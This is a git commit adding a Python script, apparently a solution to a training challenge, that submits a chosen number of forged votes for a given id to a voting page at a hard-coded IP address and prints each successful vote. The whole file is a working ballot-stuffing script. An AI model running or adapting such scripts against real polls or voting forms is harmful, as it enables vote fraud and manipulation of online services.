4a02c5fdc331766421ac84f230a8ef4575b91794
julianramirezch <julianramirezch1@gmail.com>
2020-05-29 16:29:21 -0500

    Program that votes 1024 times for your id

---
+++ level_0/level_0.py
@@ -0,0 +1,54 @@
+#!/usr/bin/python3
+""" script that votes 1024 times for your id """
+
+import requests
+
+
+def cheat_votes():
+    usr_id = 0
+    usr_votes = 0
+    votes = 0
+    usr_inputs_list = []
+    usr_inputs_list = usr_input(usr_id, usr_votes)
+    dict_entry = ['id', usr_inputs_list[0], 'holdthedoor', 'Submit']
+
+    data_input = list_dict(dict_entry)
+    total_votes = int(usr_inputs_list[1])
+
+    try:
+        for i in range(total_votes):
+            r = requests.post("http://158.69.76.135/level0.php", data=data_input)
+            print('Vote O.K: {}'.format(i + 1))
+            votes += 1
+    except Exception as error:
+        print(error)
+
+    return(votes)
+
+
+def check_is_number(number, message):
+    while not number.isnumeric():
+        number = input(message)
+    return number
+
+
+def usr_input(usr_id, usr_votes):
+    valid_number = 'Please valid id: '
+    usr_id = 0
+    usr_votes = 0
+    print('HODOR CHEAT VOTES')
+
+    usr_id = check_is_number(input('id: '), valid_number)
+    usr_votes = check_is_number(input('votes: '), valid_number)
+    return usr_id, usr_votes
+
+
+def list_dict(lst):
+    it = iter(lst)
+    res_dct = dict(zip(it, it))
+    return res_dct
+
+
+if __name__ == "__main__":
+    votes = cheat_votes()
+    print('Total success votes: {}'.format(votes))
